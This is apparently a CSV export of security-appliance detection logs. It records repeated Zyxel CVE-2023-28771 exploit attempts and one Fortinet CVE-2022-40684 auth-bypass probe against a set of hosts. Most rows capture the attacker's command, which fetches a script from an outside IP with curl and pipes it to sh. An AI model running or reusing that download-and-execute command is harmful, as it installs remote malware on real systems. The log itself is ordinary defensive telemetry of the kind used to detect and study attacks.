Date/Timestamp,Detection Severity,Detection Type,Detection Name,Threat Description,Source IP,Destination IP,Protocol,Direction,File Name,Protocol Group,Vlan ID,Risk Type Group,Destination Port,Destination MAC Address,Bot Url,Source Port,Source MAC Address,Domain Name,Hostname,Rule ID,Risk Type,File Extension,True File Type,File Size,Confidence Level,Potential Risk,Recipient,Detected By,Hasqfile,Filenameinarc,Destination Hostname,Source Hostname,Taskid,Source Group Name,Source Network Zone,Destination Group Name,Destination Network Zone,BOT Command,Is Blocked,Dcehash1,Dcehash2,Source User Logon Time 1,Source User Logon Time 2,Source User Logon Time 3,Destination User Logon Time 1,Destination User Logon Time 2,Destination User Logon Time 3,Destination User Name 1,Destination User Name 2,Destination User Name 3,Source User Name 1,Source User Name 2,Source User Name 3,Interested Ip,Peer Ip,Hasdtasres,Sha1,Log Id,Channel Name,Nickname,User Name,Authentication,User Agent,Target Share,Sender,Email Subject,URL,Sha1InArc,AttachmentFileName,AttachmentFileSize,AttachmentFileType,AttachmentSHA1,ccca_flag,ccca_risklevel,ccca_destinationformat,ccca_destination,ccca_detectionsource,ece_severity,attack_phase,Notable Object,cc_server,cc_servertype,malwaretype,event_subclass,FileTypeInArc,Event_Class,Common_Threat_Family,messageId,isHeuristic,isAptRelated,aptGroup,aptCampaign,status,Reference,HTTP Referer,Client Flag,Threat (Virtual Analyzer),Suspicious Object/Deny List Entity,TLS,Sha256,Sha256InArc,AttachmentSHA256,Yara Rule Files (Virtual Analyzer),Yara Rules (Virtual Analyzer),MITRE Version,MITRE Tactics,MITRE Techniques,MITRE Sub-techniques,JA3 Hash,JA3S Hash,Miscellaneous
2025-01-04 11:25:32,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.81,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-81.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.81,1.1.1.1,No Report,,45372696,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.81""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 11:18:47,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.93,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-93.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.93,1.1.1.1,No Report,,45372604,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.93""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 11:15:29,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.86,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-86.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.86,1.1.1.1,No Report,,45372575,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.86""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 11:10:20,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.89,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-89.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.89,1.1.1.1,No Report,,45372508,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.89""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 11:04:42,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.73,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,mailgw2.aeropuertosgap.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.73,1.1.1.1,No Report,,45372442,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.73""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:59:10,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.75,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,mailgw1.aeropuertosgap.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.75,1.1.1.1,No Report,,45372354,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.75""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:58:17,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.78,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-78.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.78,1.1.1.1,No Report,,45372350,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.78""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:33:26,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.71,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-71.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.71,1.1.1.1,No Report,,45372050,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.71""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:31:05,Medium,Exploits,,CVE-2022-40684 - FORTINET AUTHBYPASS EXPLOIT - HTTP(REQUEST),51.255.62.2,187.218.48.71,HTTP,External Detection,,HTTP,4095,Others,8015,00:09:0f:09:00:1a,,45719,00:be:75:8f:f4:81,,187.218.48.71:8015,4790,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-71.uninet-ide.com.mx,welsh.probe.onyphe.net,,,Unknown,,Unknown,,Unblocked,0,0,,,,,,,,,,,,,187.218.48.71,51.255.62.2,No Report,,45372024,,,,No,,,,,http://187.218.48.71:8015/api/v2/cmdb/system/admin/admin,,,,,,,,,,,4 Major,Point of Entry,"[""URL: http://187.218.48.71:8015/api/v2/cmdb/system/admin/admin""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2022-40684,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
2025-01-04 10:25:36,Informational,Exploits,,CVE-2023-28771 - Zyxel RCE Exploit - UDP (Request),1.1.1.1,187.218.48.79,UDP,External Detection,,UDP,4095,Others,500,00:09:0f:09:00:1a,,500,00:be:75:8f:f4:81,,,4894,OTHERS,,-65536,0,High,Potential Risk,,Network Content Inspection Engine,No,,customer-187-218-48-79.uninet-ide.com.mx,one.one.one.one,,,Unknown,,Unknown,"bash -c ""curl http://182.18.179.147/z -o-|sh"";echo -n """,Unblocked,0,0,,,,,,,,,,,,,187.218.48.79,1.1.1.1,No Report,,45371989,,,,No,,,,,,,,,,,,,,,,1 Trivial,Point of Entry,"[""IP address: 187.218.48.79""]",,,Exploit,Application,-65536,Exploit,,,No,No,,,Unresolved,CVE-2023-28771,,1,,,Not over SSL/TLS,,,,,,v9,"""Initial Access(TA0001)""","""Exploit Public-Facing Application(T1190)""",,,,
